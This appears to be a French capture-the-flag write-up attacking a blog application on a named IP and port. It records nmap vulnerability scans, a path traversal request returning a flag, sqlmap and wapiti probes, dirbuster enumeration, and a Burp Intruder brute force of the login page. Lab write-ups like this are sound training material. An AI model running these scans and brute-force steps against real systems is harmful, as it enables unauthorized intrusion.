# application-53814

ajout PORT dans `.envrc`

http://51.68.36.97:53814/

un blog avec trois posteurs : Sam, John, Henri, et un mire de login sur http://51.68.36.97:53814/login.php

pas de robots.txt `curl http://$RHOST:$PORT/robots.txt`

## énumération de failles

```sh
nmap -v -sV -Pn -p $PORT -script=vuln -oA vuln $RHOST
```

voir [rapport nmap](./vuln.nmap)

c'est la même version que le port 80 et 443 :/

## tentative de "path traversal"

les liens de blog passe pas une page get.php?page=blog1.html

si on demande autre chose alors on a un message comme quoi ca marche que avec du .html ou .txt

tentative bête et méchante :
```sh
curl http://51.68.36.97:53814/get.php\?page\=flag.txt
FLAG10{b2ece9353bac8fdda4fd579e19622607059cdec8}
```

on retrouve la valeur trouvée dans [04-apache-80](./04-apache-80), rien de plus :(

## répertoire uploads

contient trois images : pas de formulaire d'upload

## wapiti

```sh
wapiti -u http://$RHOST:$PORT -v 2 -f txt -o wapiti.general.txt
wapiti -u http://$RHOST:$PORT/login.php -m brute_login_form -v 2 -f txt -o wapiti.bruteforcelogin.txt
```

nada

## abus php via injection ?

voir https://www.vaadata.com/blog/sqlmap-the-tool-for-detecting-and-exploiting-sql-injections/

```sh
sqlmap -u "http://$RHOST:$PORT/login.php" --data='username=1'
[10:56:32] [WARNING] POST parameter 'username' does not seem to be injectable
sqlmap -u "http://$RHOST:$PORT/login.php" --data='password=1'
[11:00:10] [WARNING] POST parameter 'password' does not seem to be injectable
```

pas d'injection SQL :(

## énumération de path

```sh
dirbuster -H -l /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://$RHOST:$PORT | tee -a dirbuster.log
```

c'est long (et chiant) et ca ne donne rien : je voulais savoir (c'était avant d'avoir l'exploit/filesystem via 04-apache-80) si y'avait plus derrière...

## brute force mire de login

http://51.68.36.97:53814/login.php

exemple d'authn (vu avec la console developer firefox)
```sh
curl 'http://51.68.36.97:53814/login.php' --data-raw 'username=test&password=test'
```

renvoit toujours 200 ?!

réutilisation des credentials trouvées dans [02-smb-445](./02-smb-445) : KO

On active l'artillerie lourde avec `burp`.

voir https://portswigger.net/support/using-burp-to-brute-force-a-login-page

avec intruder, sur la liste de user Sam, John, Henri, admin, Admin

pause si invalid login est absent de la réponse voir settings

une authentification permet de trouver le flag 7 dans la page de l'admin.
